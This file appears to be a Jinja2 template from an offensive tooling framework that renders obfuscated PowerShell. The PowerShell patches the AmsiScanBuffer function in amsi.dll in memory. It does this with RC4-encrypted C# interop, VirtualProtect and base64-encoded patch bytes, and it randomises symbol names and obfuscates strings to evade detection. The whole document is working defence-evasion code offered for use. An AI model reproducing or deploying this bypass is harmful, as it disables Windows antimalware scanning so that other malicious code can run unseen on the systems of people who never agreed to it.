{% from 'macros.jinja2' import obfuscate with context %}

{% set winpatch = '''
using System;
using System.Runtime.InteropServices;

public class ''' + symbol_name("Win32") + ''' {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
''' %}

${{symbol_name("Win32")}} = {{symbol_name("Decrypt-String")}} "{{winpatch|rc4encrypt}}";

Add-Type ${{symbol_name("Win32")}};

${{symbol_name("address")}} = [{{symbol_name("Win32")}}]::{{obfuscate("GetProcAddress")}}.Invoke([{{symbol_name("Win32")}}]::{{obfuscate("LoadLibrary")}}.Invoke({{obfuscate("amsi.dll")}}), {{obfuscate("AmsiScanBuffer")}});
${{symbol_name("nullpointer")}} = 0;
[{{symbol_name("Win32")}}]::{{obfuscate("VirtualProtect")}}.Invoke(${{symbol_name("address")}}, [uint32]5, 0x40, [ref]${{symbol_name("nullpointer")}});
${{symbol_name("bytes")}} = {{obfuscate("uFcAB4DD")}};
${{symbol_name("patch")}} = [System.Convert]::{{obfuscate("FromBase64String")}}.Invoke(${{symbol_name("bytes")}});
[System.Runtime.InteropServices.Marshal]::{{obfuscate("Copy")}}.Invoke(${{symbol_name("patch")}}, 0, ${{symbol_name("address")}}, 6);
